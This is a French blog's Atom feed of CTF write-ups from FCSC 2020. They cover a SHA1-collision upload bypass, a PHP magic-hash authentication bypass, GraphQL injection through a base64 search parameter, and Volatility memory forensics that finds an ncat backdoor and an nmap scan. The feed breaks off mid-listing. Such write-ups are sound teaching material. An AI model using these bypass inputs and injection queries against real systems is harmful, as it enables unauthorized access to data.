@@ -1,0 +1,730 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.0.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-11-09T19:43:53+01:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Vixepti</title><subtitle>Administration systèmes et réseaux, Sécurité informatique, Hacking, Bricolage et autres joyeusetés...</subtitle><entry><title type="html">Writeup - FCSC-2020 - Web - Revision</title><link href="http://localhost:4000/writeup/2020/05/05/fcsc-2020-writeup-revision.html" rel="alternate" type="text/html" title="Writeup - FCSC-2020 - Web - Revision" /><published>2020-05-05T19:00:13+02:00</published><updated>2020-05-05T19:00:13+02:00</updated><id>http://localhost:4000/writeup/2020/05/05/fcsc-2020-writeup-revision</id><content type="html" xml:base="http://localhost:4000/writeup/2020/05/05/fcsc-2020-writeup-revision.html"><![CDATA[<p>Petit writeup sur un challenge que j’ai trouvé très intéressant. <em>Revision</em> est un challenge web du <em>France Cybersecurity Challenge</em>. <!--more--></p>
+
+<h1 id="énoncé">Énoncé</h1>
+
+<blockquote>
+  <p>La société Semper est spécialisée en archivage de documents électroniques. Afin de simplifier le travail des archivistes, un outil simple de  suivi de modification a été mis en ligne. Depuis quelques temps néanmoins, cet outil dysfonctionne. Les salariés se plaignent de ne pas recevoir tous les documents et il n’est pas rare que le système plante. Le développeur de l’application pense avoir identifié l’origine du problème. Aidez-le à reproduire le bug.</p>
+
+  <p><strong>Note</strong> : La taille totale des fichiers est limitée à 2Mo.</p>
+</blockquote>
+
+<h1 id="solution">Solution</h1>
+
+<p>On a la page suivante :</p>
+
+<p style="text-align: center;"><img src="/assets/2020/05/fcsc-revision-welcome.png" alt="Revision Homepage" /></p>
+
+<p>Et le code python qui gère les fichiers.</p>
+
+<p>L’énoncé indique qu’il y a un soucis et que les documents ne sont pas tous envoyés. Quand on regarde le code, on peut voir cette fonction :</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">store</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+    <span class="bp">self</span><span class="p">.</span><span class="n">_reset_cursor</span><span class="p">()</span>
+    <span class="n">f1_hash</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">_compute_sha1</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">f1</span><span class="p">)</span>
+    <span class="n">f2_hash</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">_compute_sha1</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">f2</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="bp">self</span><span class="p">.</span><span class="n">db</span><span class="p">.</span><span class="n">document_exists</span><span class="p">(</span><span class="n">f1_hash</span><span class="p">)</span> <span class="ow">or</span> <span class="bp">self</span><span class="p">.</span><span class="n">db</span><span class="p">.</span><span class="n">document_exists</span><span class="p">(</span><span class="n">f2_hash</span><span class="p">):</span>
+        <span class="k">raise</span> <span class="n">DatabaseError</span><span class="p">()</span>
+
+    <span class="n">attachments</span> <span class="o">=</span> <span class="nb">set</span><span class="p">([</span><span class="n">f1_hash</span><span class="p">,</span> <span class="n">f2_hash</span><span class="p">])</span>
+    <span class="c1"># Debug debug...
+</span>    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">attachments</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
+        <span class="k">raise</span> <span class="n">StoreError</span><span class="p">([</span><span class="n">f1_hash</span><span class="p">,</span> <span class="n">f2_hash</span><span class="p">],</span> <span class="bp">self</span><span class="p">.</span><span class="n">_get_flag</span><span class="p">())</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">m</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">attachments</span><span class="o">=</span><span class="n">attachments</span><span class="p">)</span></code></pre></figure>
+
+<p>Ce qui est intéressant ici, c’est que si les fichiers sont connus dans le système et que les empreintes (hash SHA1) des fichiers sont identiques, le flag s’affiche. Il faut donc 2 pdf différents ayant la même empreinte SHA1.</p>
+
+<p>J’ai donc cherché s’il existait des collisions sha1 possible sur des fichiers pdf et j’ai trouvé : <a href="https://shattered.io/">shattered.io</a>. Évidemment, les fichiers de ce site on déjà été utilisés sur le challenge. Il faut donc créer nos propres fichiers.</p>
+
+<p>Grâce à <a href="https://alf.nu/SHA1">SHA1 Collider</a>, j’ai pu générer 2 fichiers pdf à partir de 2 images de 512px X 512px. Ces fichiers sont sensés avoir la même empreinte SHA1, donc je vérifie :</p>
+
+<figure class="highlight"><pre><code class="language-shell_session" data-lang="shell_session"><span class="gp">[vixepti@computer]$</span><span class="w"> </span><span class="nb">sha1sum </span>vixcol1.pdf 
+<span class="go">8dff8358654e967a838c7575a82ed2e6aa14f1ae  vixcol1.pdf
+</span><span class="gp">[vixepti@computer]$</span><span class="w"> </span><span class="nb">sha1sum </span>vixcol2.pdf 
+<span class="go">8dff8358654e967a838c7575a82ed2e6aa14f1ae  vixcol2.pdf</span></code></pre></figure>
+
+<p>Puis j’envoie les fichiers :</p>
+
+<p style="text-align: center;"><img src="/assets/2020/05/revision-flag.png" alt="Revision Flag" /></p>
+
+<h1 id="flag">Flag</h1>
+
+<p>Le flag est donc : <strong><em>FCSC{8f95b0fc1a793e102a65bae9c473e9a3c2893cf083a539636b082605c40c00c1}</em></strong></p>]]></content><author><name>Vixepti</name></author><category term="writeup" /><category term="FCSC" /><category term="ctf" /><category term="writeup" /><category term="web" /><summary type="html"><![CDATA[Petit writeup sur un challenge que j’ai trouvé très intéressant. Revision est un challenge web du France Cybersecurity Challenge.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/2020/05/FCSC.png" /><media:content medium="image" url="http://localhost:4000/assets/2020/05/FCSC.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Writeup - FCSC-2020 - Web - Enter The Dungeon</title><link href="http://localhost:4000/writeup/2020/05/05/fcsc-2020-writeup-enter-the-dungeon.html" rel="alternate" type="text/html" title="Writeup - FCSC-2020 - Web - Enter The Dungeon" /><published>2020-05-05T19:00:12+02:00</published><updated>2020-05-05T19:00:12+02:00</updated><id>http://localhost:4000/writeup/2020/05/05/fcsc-2020-writeup-enter-the-dungeon</id><content type="html" xml:base="http://localhost:4000/writeup/2020/05/05/fcsc-2020-writeup-enter-the-dungeon.html"><![CDATA[<p>Hello, ceci est mon writeup pour le challenge <em>Enter The Dungeon</em> du <em>France Cybersecurity Challenge 2020</em>. J’ai passé un sacré moment dessus (je ne suis pas du tout expériementé dans le domaine du web), ça méritait bien un writeup.<!--more--></p>
+
+<h1 id="énoncé">Énoncé</h1>
+<blockquote>
+  <p>On vous demande simplement de trouver le flag.</p>
+
+  <p>URL : http://challenges2.france-cybersecurity-challenge.fr:5002/</p>
+</blockquote>
+
+<p>On a la page web suivante :</p>
+
+<p style="text-align: center;"><img src="/assets/2020/05/EnterTheDungeon-home.png" alt="Enter The Dungeon - Homepage" /></p>
+
+<h1 id="solution">Solution</h1>
+
+<h2 id="ctrl--u">CTRL + U</h2>
+<p>Première étape d’un challenge web, consulter le code source de la page :</p>
+
+<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+	<span class="nt">&lt;title&gt;</span>Enter The Dungeon<span class="nt">&lt;/title&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;body</span> <span class="na">style=</span><span class="s">"background-color:#3CB371;"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;center&gt;&lt;h1&gt;</span>Enter The Dungeon<span class="nt">&lt;/h1&gt;&lt;/center&gt;</span>
+The flag is hidden into the dungeon ! You should come here as the <span class="nt">&lt;b&gt;</span>dungeon_master<span class="nt">&lt;/b&gt;</span> to be able to open the gate and access the treasure.<span class="nt">&lt;br</span> <span class="nt">/&gt;&lt;br</span> <span class="nt">/&gt;</span>
+
+<span class="c">&lt;!-- Pour les admins : si vous pouvez valider les changements que j'ai fait dans la page "check_secret.php", le code est accessible sur le fichier "check_secret.txt" --&gt;</span>
+<span class="nt">&lt;div</span> <span class="na">style=</span><span class="s">"font-size:85%;color:purple"</span><span class="nt">&gt;&lt;i&gt;</span>Les admins ont reçu un message indiquant qu'un pirate avait retrouvé le secret en contournant la sécurité du site. <span class="nt">&lt;br</span> <span class="nt">/&gt;</span>Pour cette raison, le formulaire de vérification n'est plus fonctionnel tant que le développeur n'aura pas corrigé la vulnérabilité<span class="nt">&lt;/i&gt;&lt;/div&gt;&lt;br</span> <span class="nt">/&gt;</span></code></pre></figure>
+
+<p>Ici, on remarque très clairement le commentaire :</p>
+
+<blockquote>
+  <p>Pour les admins : si vous pouvez valider les changements que j’ai fait dans la page “check_secret.php”, le code est accessible sur le fichier “check_secret.txt”</p>
+</blockquote>
+
+<p>Il y a donc un fichier <em>check_secret.txt</em> contenant :</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+	<span class="nb">session_start</span><span class="p">();</span>
+	<span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'dungeon_master'</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="cp">?&gt;</span>
+<span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+	<span class="nt">&lt;title&gt;</span>Enter The Dungeon<span class="nt">&lt;/title&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;body</span> <span class="na">style=</span><span class="s">"background-color:#3CB371;"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;center&gt;&lt;h1&gt;</span>Enter The Dungeon<span class="nt">&lt;/h1&gt;&lt;/center&gt;</span>
+<span class="cp">&lt;?php</span>
+	<span class="k">echo</span> <span class="s1">'&lt;div style="font-size:85%;color:purple"&gt;For security reason, secret check is disable !&lt;/div&gt;&lt;br /&gt;'</span><span class="p">;</span>
+	<span class="k">echo</span> <span class="s1">'&lt;pre&gt;'</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
+	<span class="k">include</span><span class="p">(</span><span class="s1">'./ecsc.txt'</span><span class="p">);</span>
+	<span class="k">echo</span> <span class="nb">chr</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span><span class="mf">.</span><span class="s1">'&lt;/pre&gt;'</span><span class="p">;</span>
+
+	<span class="c1">// authentication is replaced by an impossible test</span>
+	<span class="c1">//if(md5($_GET['secret']) == "a5de2c87ba651432365a5efd928ee8f2")</span>
+	<span class="k">if</span><span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'secret'</span><span class="p">])</span> <span class="o">==</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'secret'</span><span class="p">])</span>
+	<span class="p">{</span>
+		<span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'dungeon_master'</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+		<span class="k">echo</span> <span class="s2">"Secret is correct, welcome Master ! You can now enter the dungeon"</span><span class="p">;</span>
+		
+	<span class="p">}</span>
+	<span class="k">else</span>
+	<span class="p">{</span>
+		<span class="k">echo</span> <span class="s2">"Wrong secret !"</span><span class="p">;</span>
+	<span class="p">}</span>
+<span class="cp">?&gt;</span>
+<span class="nt">&lt;/body&gt;&lt;/html&gt;</span></code></pre></figure>
+
+<p>Bon c’est donc le système de login utilisé pour accéder au “Donjon”.</p>
+
+<h2 id="recherches-infructueuses">Recherches infructueuses</h2>
+
+<p>Je me suis d’abord penché sur le hash md5 qui se situe dans les commentaires : a5de2c87ba651432365a5efd928ee8f2</p>
+
+<ol>
+  <li>J’ai essayé de chercher si la chaine de caractère correspondante existe dans les bases de données de plusieurs sites :
+    <ul>
+      <li><a href="https://md5decrypt.net/en/">md5decrypt</a></li>
+      <li><a href="https://md5hashing.net/hash/md5">md5hashing</a></li>
+    </ul>
+  </li>
+  <li>J’ai essayé de retouver le hash depuis plusieurs chaines de caractères probables. En fait, j’ai été induit en erreur par la phrase présente sur la page d’accueil :</li>
+</ol>
+
+<blockquote>
+  <p>You should come here as the dungeon_master to be able to open the gate and access the treasure.</p>
+</blockquote>
+
+<p>Je me suis dis que l’on pouvait peut être obtenir le hash en utilisant md5 sur :</p>
+
+<ul>
+  <li>dungeon_master</li>
+  <li>dungeon_master=1</li>
+  <li>master of the dungeon</li>
+  <li>dragon (ouais, D&amp;D, tu connais..)</li>
+  <li>…</li>
+</ul>
+
+<p>J’ai essayé pas mal de chaînes de caractères mais bien évidemment je n’ai pas trouvé.</p>
+
+<ol>
+  <li>J’ai également essayé de cracker le hash avec hashcat. J’ai laissé tourner une heure puis j’ai arrêté. Si c’était trouvable par ce moyen, j’aurai déjà eu un résultat.</li>
+</ol>
+
+<h2 id="magic-hashes">Magic Hashes</h2>
+
+<p>En continuant à chercher, j’ai finis par découvrir les magic hashes. Ce sont couples chaines de caractère/hash dont la valeur du md5 commence par “0e”. C’est intéressant car en PHP la comparaison avec == au lieu de === va vérifier uniquement le type au lieu de comparer ces valeurs. Or, la chaine commençant par 0e en PHP sera reconnu comme une notation scientifique, il faut donc trouver une valeur commençant par 0e et dont le hash md5 commence également par 0e.</p>
+
+<p>Et on a de la chance cette valeur existe : <strong>0e215962017</strong> a pour hash md5 <strong>0e291242476940776845150308577824</strong>.</p>
+
+<p>On entre donc cette valeur dans le formulaire et on a le résultat suivant :</p>
+
+<p style="text-align: center;"><img src="/assets/2020/05/EnterTheDungeon-welcome.png" alt="Enter The Dungeon - Homepage" /></p>
+
+<p>On peut ensuite retourner sur la page d’accueil :</p>
+
+<p style="text-align: center;"><img src="/assets/2020/05/EnterTheDungeon-flag.png" alt="Enter The Dungeon - Homepage" /></p>
+
+<h1 id="flag">Flag</h1>
+
+<p>Le flag est donc : <strong><em>FCSC{f67aaeb3b15152b216cb1addbf0236c66f9d81c4487c4db813c1de8603bb2b5b}</em></strong></p>]]></content><author><name>Vixepti</name></author><category term="writeup" /><category term="FCSC" /><category term="web" /><category term="ctf" /><category term="writeup" /><summary type="html"><![CDATA[Hello, ceci est mon writeup pour le challenge Enter The Dungeon du France Cybersecurity Challenge 2020. J’ai passé un sacré moment dessus (je ne suis pas du tout expériementé dans le domaine du web), ça méritait bien un writeup.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/2020/05/FCSC.png" /><media:content medium="image" url="http://localhost:4000/assets/2020/05/FCSC.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Writeup - FCSC-2020 - Web - RainbowPages</title><link href="http://localhost:4000/writeup/2020/05/05/fcsc-2020-writeup-rainbowpages.html" rel="alternate" type="text/html" title="Writeup - FCSC-2020 - Web - RainbowPages" /><published>2020-05-05T19:00:11+02:00</published><updated>2020-05-05T19:00:11+02:00</updated><id>http://localhost:4000/writeup/2020/05/05/fcsc-2020-writeup-rainbowpages</id><content type="html" xml:base="http://localhost:4000/writeup/2020/05/05/fcsc-2020-writeup-rainbowpages.html"><![CDATA[<p>Writeup sur l’épreuve <em>RainbowPages</em> du <em>France Cybersecurity Challenge 2020</em>.<!--more--></p>
+
+<h1 id="énoncé">Énoncé</h1>
+<blockquote>
+  <p>Nous avons développé une plateforme de recherche de cuisiniers. Venez la tester !</p>
+</blockquote>
+
+<p style="text-align: center;"><img src="/assets/2020/05/rainbowpages-homepage.png" alt="RainbowPages Homepage" /></p>
+
+<h1 id="solution">Solution</h1>
+
+<p>La page permet donc de chercher des chefs cuisiniers. Je lance une recherche :</p>
+
+<figure class="highlight"><pre><code class="language-generic" data-lang="generic">GET /index.php?search=eyBhbGxDb29rcyAoZmlsdGVyOiB7IGZpcnN0bmFtZToge2xpa2U6ICIldGglIn19KSB7IG5vZGVzIHsgZmlyc3RuYW1lLCBsYXN0bmFtZSwgc3BlY2lhbGl0eSwgcHJpY2UgfX19 HTTP/1.1
+Host: challenges2.france-cybersecurity-challenge.fr:5006
+Connection: keep-alive
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36
+Accept: */*
+Referer: http://challenges2.france-cybersecurity-challenge.fr:5006/
+Accept-Encoding: gzip, deflate
+Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: PHPSESSID=a6404b49723f89736210beb430d00106; session=eyJjc3JmX3Rva2VuIjoiMDQ3MzE1YjUzMTBjNGExODAyNmZmMTBkYjUwZTc5NGU1ZDI0MDVlMCJ9.XrEQkA.RHMeWiihOb4wktyg3nzR_e9Exn8</code></pre></figure>
+
+<p>Je remarque un paramètre <em>GET</em> nommé <em>search</em> :</p>
+
+<blockquote>
+  <p>eyBhbGxDb29rcyAoZmlsdGVyOiB7IGZpcnN0bmFtZToge2xpa2U6ICIldGglIn19KSB7IG5vZGVzIHsgZmlyc3RuYW1lLCBsYXN0bmFtZSwgc3BlY2lhbGl0eSwgcHJpY2UgfX19</p>
+</blockquote>
+
+<p>Décodé depuis la base64 :</p>
+
+<blockquote>
+  <p>{ allCooks (filter: { firstname: {like: “%th%”}}) { nodes { firstname, lastname, speciality, price }}}</p>
+</blockquote>
+
+<p>On a donc affaire a graphQl, et je peux donc faire mes requêtes dans ce paramètre en base64 :</p>
+
+<blockquote>
+  <p>{ allFlags { nodes { flag }}}</p>
+</blockquote>
+
+<p>En base64 ça donne :</p>
+
+<blockquote>
+  <p>eyBhbGxGbGFncyB7IG5vZGVzIHsgZmxhZyB9fX0K</p>
+</blockquote>
+
+<p>Je lance donc une requête sur : http://challenges2.france-cybersecurity-challenge.fr:5006/?search=eyBhbGxGbGFncyB7IG5vZGVzIHsgZmxhZyB9fX0K</p>
+
+<p>Et j’obtiens comme réponse :</p>
+
+<figure class="highlight"><pre><code class="language-json" data-lang="json"><span class="p">{</span><span class="nl">"data"</span><span class="p">:{</span><span class="nl">"allFlags"</span><span class="p">:{</span><span class="nl">"nodes"</span><span class="p">:[{</span><span class="nl">"flag"</span><span class="p">:</span><span class="s2">"FCSC{1ef3c5c3ac3c56eb178bafea15b07b82c4a0ea8184d76a722337dca108add41a}"</span><span class="p">}]}}}</span></code></pre></figure>
+
+<h1 id="flag">Flag</h1>
+
+<p>Le flag est donc : <strong><em>FCSC{1ef3c5c3ac3c56eb178bafea15b07b82c4a0ea8184d76a722337dca108add41a}</em></strong></p>]]></content><author><name>Vixepti</name></author><category term="writeup" /><category term="FCSC" /><category term="ctf" /><category term="writeup" /><category term="web" /><summary type="html"><![CDATA[Writeup sur l’épreuve RainbowPages du France Cybersecurity Challenge 2020.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/2020/05/FCSC.png" /><media:content medium="image" url="http://localhost:4000/assets/2020/05/FCSC.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Writeup - FCSC-2020 - Forensics - Académie de l’investigation - Porte Dérobée</title><link href="http://localhost:4000/writeup/2020/05/05/fcsc-2020-writeup-porte-derobee.html" rel="alternate" type="text/html" title="Writeup - FCSC-2020 - Forensics - Académie de l’investigation - Porte Dérobée" /><published>2020-05-05T19:00:10+02:00</published><updated>2020-05-05T19:00:10+02:00</updated><id>http://localhost:4000/writeup/2020/05/05/fcsc-2020-writeup-porte-derobee</id><content type="html" xml:base="http://localhost:4000/writeup/2020/05/05/fcsc-2020-writeup-porte-derobee.html"><![CDATA[<p>Encore un writeup sur la série <em>Académie de l’investigation</em>, pour le France CyberSecurity Challenge de 2020, sur le challenge <em>Porte dérobée</em>. Le but est de retrouver des infos sur une porte dérobée dans un dump mémoire. <!--more--></p>
+
+<h1 id="énoncé">Énoncé</h1>
+
+<blockquote>
+  <p>Un poste distant est connecté au poste en cours d’analyse via une porte dérobée avec la capacité d’exécuter des commandes.</p>
+
+  <ul>
+    <li>Quel est le numéro de port à l’écoute de cette connexion ?</li>
+    <li>Quelle est l’adresse IP distante connectée au moment du dump ?</li>
+    <li>Quel est l’horodatage de la création du processus en <em>UTC</em> de cette porte dérobée ?</li>
+  </ul>
+
+  <p>Format du flag : <em>FCSC{port:IP:YYYY-MM-DD HH:MM:SS}</em></p>
+
+  <p>Le fichier de dump à analyser est identique au challenge <em>C’est la rentrée</em>.</p>
+</blockquote>
+
+<h1 id="solution">Solution</h1>
+
+<p>On cherche une porte dérobée qui est actuellement utilisée. Je cherche donc des connexions <em>ESTABLISHED</em> grâce à la commande volatility <em>linux_netstat</em> :</p>
+
+<figure class="highlight"><pre><code class="language-shell_session" data-lang="shell_session"><span class="gp">[vixepti@computer]$</span><span class="w"> </span>python2.7 vol.py <span class="nt">-f</span> ../dmp.mem <span class="nt">--profile</span><span class="o">=</span>LinuxDebian5404-zipx64 linux_netstat | <span class="nb">grep </span>ESTABLISHED
+<span class="go">Volatility Foundation Volatility Framework 2.6.1
+TCP      10.42.42.131    :36970 116.203.52.118  :  443 ESTABLISHED                   tor/706  
+TCP      10.42.42.131    :37252 163.172.182.147 :  443 ESTABLISHED                   tor/706  
+TCP      fd:6663:7363:1000:c10b:6374:25f:dc37:36280 fd:6663:7363:1000:55cf:b9c6:f41d:cc24:58014 ESTABLISHED                  ncat/1515 
+TCP      10.42.42.131    :47106 216.58.206.226  :  443 ESTABLISHED              chromium/119187
+TCP      10.42.42.131    :55224 151.101.121.140 :  443 ESTABLISHED              chromium/119187
+TCP      10.42.42.131    :55226 151.101.121.140 :  443 ESTABLISHED              chromium/119187
+TCP      10.42.42.131    :53190 104.124.192.89  :  443 ESTABLISHED              chromium/119187
+TCP      10.42.42.131    :45652 35.190.72.21    :  443 ESTABLISHED              chromium/119187
+TCP      10.42.42.131    :47102 216.58.206.226  :  443 ESTABLISHED              chromium/119187
+TCP      10.42.42.131    :47104 216.58.206.226  :  443 ESTABLISHED              chromium/119187
+TCP      10.42.42.131    :38186 216.58.213.142  :  443 ESTABLISHED              chromium/119187
+TCP      10.42.42.131    :47100 216.58.206.226  :  443 ESTABLISHED              chromium/119187
+TCP      10.42.42.131    :50612 104.93.255.199  :  443 ESTABLISHED              chromium/119187
+TCP      10.42.42.131    :58772 185.199.111.154 :  443 ESTABLISHED              chromium/119187
+TCP      10.42.42.131    :38184 216.58.213.142  :  443 ESTABLISHED              chromium/119187
+TCP      10.42.42.131    :57000 10.42.42.134    :   22 ESTABLISHED                   ssh/119468
+TCP      fd:6663:7363:1000:c10b:6374:25f:dc37:36280 fd:6663:7363:1000:55cf:b9c6:f41d:cc24:58014 ESTABLISHED                    sh/119511
+TCP      127.0.0.1       :38498 127.0.0.1       :34243 ESTABLISHED                   cli/119514
+TCP      127.0.0.1       :34243 127.0.0.1       :38498 ESTABLISHED                   cli/119514
+TCP      10.42.42.131    :51858 10.42.42.128    :  445 ESTABLISHED             smbclient/119577</span></code></pre></figure>
+
+<p>Je procède par élimination :</p>
+<ul>
+  <li>tor : Quelqu’un est sûrement en train de lire des théories du complot sur le COVID-19.</li>
+  <li>chromium : Le navigateur internet..</li>
+  <li>ssh : Certainement utilisé pour se connecter à la machine par l’utilisateur Lesage.</li>
+  <li>cli : Utilise l’adresse 127.0.0.1, ce serait étonnant que la backdoor soit ici.</li>
+  <li>smbclient : Utilisé pour accéder à un répertoire partagé sur le réseau, j’avais vu je ne sais plus où en analysant le dump la commande pour monter ce répertoire qui semblait tout à fait légitime.</li>
+</ul>
+
+<p>En fait ce qui me saute vraiment aux yeux c’est le ncat. Nous avons donc certainement :</p>
+<ul>
+  <li><strong>Port à l’écoute</strong> : 36280</li>
+  <li><strong>Adresse IP distante</strong> : fd:6663:7363:1000:55cf:b9c6:f41d:cc24</li>
+</ul>
+
+<p>Et pour retrouver l’horodatage, j’utilise la commande volatility <em>linux_pslist</em> en filtrant avec <em>grep</em> sur le PID qui m’intéresse, celui de ncat (1515) :</p>
+
+<figure class="highlight"><pre><code class="language-shell_session" data-lang="shell_session"><span class="gp">[vixepti@computer]$</span><span class="w"> </span>python2.7 vol.py <span class="nt">-f</span> ../dmp.mem <span class="nt">--profile</span><span class="o">=</span>LinuxDebian5404-zipx64 linux_pslist | <span class="nb">grep </span>1515
+<span class="go">Volatility Foundation Volatility Framework 2.6.1
+0xffff9d72c014be00 ncat                 1515            1513            1001            1001   0x000000003e3d0000 2020-03-26 23:24:20 UTC+0000
+0xffff9d72c5d50000 sh                   119511          1515            1001            1001   0x00000000128ac000 2020-03-26 23:32:36 UTC+0000</span></code></pre></figure>
+
+<ul>
+  <li><strong>Horodatage :</strong> 2020-03-26 23:24:20</li>
+</ul>
+
+<h1 id="flag">Flag</h1>
+
+<p>Le flag est donc : <strong><em>FCSC{36280:fd:6663:7363:1000:55cf:b9c6:f41d:cc24:2020-03-26 23:24:20}</em></strong></p>]]></content><author><name>Vixepti</name></author><category term="writeup" /><category term="FCSC" /><category term="forensic" /><category term="ctf" /><category term="writeup" /><summary type="html"><![CDATA[Encore un writeup sur la série Académie de l’investigation, pour le France CyberSecurity Challenge de 2020, sur le challenge Porte dérobée. Le but est de retrouver des infos sur une porte dérobée dans un dump mémoire.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/2020/05/FCSC.png" /><media:content medium="image" url="http://localhost:4000/assets/2020/05/FCSC.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Writeup - FCSC-2020 - Forensics - Académie de l’investigation - Premier artéfacts</title><link href="http://localhost:4000/writeup/2020/05/05/fcsc-2020-writeup-premier-artefacts.html" rel="alternate" type="text/html" title="Writeup - FCSC-2020 - Forensics - Académie de l’investigation - Premier artéfacts" /><published>2020-05-05T19:00:09+02:00</published><updated>2020-05-05T19:00:09+02:00</updated><id>http://localhost:4000/writeup/2020/05/05/fcsc-2020-writeup-premier-artefacts</id><content type="html" xml:base="http://localhost:4000/writeup/2020/05/05/fcsc-2020-writeup-premier-artefacts.html"><![CDATA[<p>Toujours dans la série <em>Académie de l’investigation</em>, ceci est mon writeup pour le France CyberSecurity Challenge de 2020, sur le challenge <em>Premier Artéfacts</em>. Le but est de retrouver des infos sur un processus, une commande et une connexion réseau. <!--more--></p>
+
+<h1 id="énoncé">Énoncé</h1>
+
+<blockquote>
+  <p>Pour avancer dans l’analyse, vous devez retrouver :</p>
+
+  <ul>
+    <li>Le nom de processus ayant le PID 1254.</li>
+    <li>La commande exacte qui a été exécutée le 2020-03-26 23:29:19 UTC.</li>
+    <li>Le nombre d’IP-DST unique en communications TCP établies (état ESTABLISHED) lors du dump.</li>
+  </ul>
+
+  <p>Format du flag : <em>FCSC{nom_du_processus:une_commande:n}</em></p>
+
+  <p>Le fichier de dump à analyser est identique au challenge <em>C’est la rentrée</em>.</p>
+</blockquote>
+
+<h1 id="solution">Solution</h1>
+
+<p>Le premier challenge de la série m’a permis d’obtenir les informations nécessaire à la création d’un profile volatility. Je peux donc maintenant utiliser ce logiciel.</p>
+
+<h2 id="processus">Processus</h2>
+
+<p>La liste des processus peut être obtenu grâce à <em>linux_psscan</em>. Puis, grâce à <em>grep</em> je peux filtrer selon le PID qui nous intéresse :</p>
+
+<figure class="highlight"><pre><code class="language-shell_session" data-lang="shell_session"><span class="gp">[vixepti@computer]$</span><span class="w"> </span>python2.7 vol.py <span class="nt">-f</span> ../dmp.mem <span class="nt">--profile</span><span class="o">=</span>LinuxDebian5404-zipx64 linux_psscan |grep 1254
+<span class="go">Volatility Foundation Volatility Framework 2.6.1
+0x000000003fdccd80 pool-xfconfd         1254            -               -1              -1     0x0fd08ee88ee08ec0 -</span></code></pre></figure>
+
+<p>Le nom du processus est donc : <strong><em>pool-xfconfd</em></strong></p>
+
+<h2 id="commande">Commande</h2>
+
+<p>La commande ayant été executé le <em>2020-03-26 23:29:19</em> peut être trouvé grâce à la commande <em>linux_bash</em>, qui affiche l’historique des commandes. Je filtre sur la date avec <em>grep</em> pour avoir uniquement la commande qui nous intéresse.</p>
+
+<figure class="highlight"><pre><code class="language-shell_session" data-lang="shell_session"><span class="gp">[vixepti@computer]$</span><span class="w"> </span>python2.7 vol.py <span class="nt">-f</span> ../dmp.mem <span class="nt">--profile</span><span class="o">=</span>LinuxDebian5404-zipx64 linux_bash | <span class="nb">grep</span> <span class="s2">"2020-03-26 23:29:19"</span>
+<span class="go">Volatility Foundation Volatility Framework 2.6.1
+    1523 bash                 2020-03-26 23:29:19 UTC+0000   nmap -sS -sV 10.42.42.0/24</span></code></pre></figure>
+
+<p>La commande est donc : <strong><em>nmap -sS -sV 10.42.42.0/24</em></strong></p>
+
+<h2 id="nombre-dip-dst">Nombre d’IP-DST</h2>
+
+<p>Pour obtenir la liste des connexions j’utilise la commande <em>linux_netstat</em> que je filtre avec <em>grep</em> sur les connexions ayant un état <em>ESTABLISHED</em> uniquement :</p>
+
+<figure class="highlight"><pre><code class="language-shell_session" data-lang="shell_session"><span class="gp">[vixepti@computer]$</span><span class="w"> </span>python2.7 vol.py <span class="nt">-f</span> ../dmp.mem <span class="nt">--profile</span><span class="o">=</span>LinuxDebian5404-zipx64 linux_netstat | <span class="nb">grep </span>ESTABLISHED
+<span class="go">Volatility Foundation Volatility Framework 2.6.1
+TCP      10.42.42.131    :36970 116.203.52.118  :  443 ESTABLISHED                   tor/706  
+TCP      10.42.42.131    :37252 163.172.182.147 :  443 ESTABLISHED                   tor/706  
